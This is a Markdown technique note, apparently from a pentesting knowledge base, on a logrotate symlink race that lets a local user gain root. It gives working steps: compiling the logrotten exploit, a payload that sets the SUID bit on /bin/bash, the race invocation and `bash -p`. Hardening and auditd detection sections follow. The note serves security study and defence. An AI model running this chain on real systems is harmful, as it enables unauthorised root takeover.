---
topic: Carrera de logrotate: directorio escribible y opción create
tags: [linux, privesc, logrotate, race-condition, symlink]
---

# logrotate race: writable directory and the `create` option

**English** | [🇪🇸 Español](logrotate-race.md)

## Idea

`logrotate` rotates log files with the privileges of whoever runs it, usually root. If the directory holding the log is writable by an unprivileged user and the configuration uses `create`, there is a window between the `rename` of the directory and the creation of the new file where a symlink placed by the attacker redirects the write. The result is a file with attacker-controlled content, owned by the attacker, in a root path.

This is not a CVE: it is a configuration condition. The tool that automates it is `logrotten`.

## When it applies

Three things must line up:

1. A `logrotate` run by root (cron, systemd timer or script) over a specific path.
2. The `create` directive (or `createolddir`) in that configuration.
3. The log directory, or its parent, writable by the attacking user.

Without `create`, `logrotate` does not create the new file and the race is useless. `copytruncate` also rules it out.

## Checks

```bash
pspy -pf -i 1000            # see logrotate and its config
logrotate --version         # 3.8.0 - 3.16.0 are the race-prone versions
ls -ld /path/to/log
cat /etc/logrotate.d/<service>
```

## Commands

```bash
git clone https://codeberg.org/whotwagner/logrotten
cd logrotten && gcc -o logrotten logrotten.c

printf '#!/bin/sh\nchmod u+s /bin/bash\n' > payload
./logrotten -p ./payload /home/<USER>/backups/access.log
```

`logrotten` renames the log directory and points a symlink at the chosen destination (`/etc/bash_completion.d/`, `/etc/cron.d/`, an `authorized_keys`). When root runs `logrotate -f`, `create` follows the link and writes the file with the log content the attacker controls.

The later trigger depends on the destination: a root local login that loads completions, a cron that reads the directory, or a service that executes the file.

```bash
bash -p                     # keeps the SUID privileges
id
```

## Variants

- Wrap the payload in a script that only runs when `$EUID` is 0, so the user's session is not broken.
- Loop the race: the window is milliseconds wide and often misses.
- Use the log itself as content (`printf '<?php ...'`) when the target is a web directory.
- If the log lives in a subdirectory of the home, check whether the whole home is writable: sometimes moving the directory is enough.

## Hardening

- `root:root` ownership and no group/other write on log directories.
- Avoid `create` over user paths; use `copytruncate` or rotate from a service running as its own user.
- Review `/etc/logrotate.d/` entries pointing at homes or application directories.
- Monitor ownership and symlink changes in log directories.

## Detection

- `auditd`: `-w /etc/bash_completion.d -p wa`, `-w /etc/cron.d -p wa`, `-w /home -p wa`.
- `rename`/`symlink` events on log directories followed by files owned by a user.
- `logrotate` invoked with `-f` from a custom script, with permission errors in its output.
- New SUID files in `/bin`, `/usr/bin` or `/tmp`.

## References

- <https://www.exploit-db.com/exploits/47466>
- <https://codeberg.org/whotwagner/logrotten>
- <https://linux.die.net/man/8/logrotate>
- <https://attack.mitre.org/techniques/T1068/>
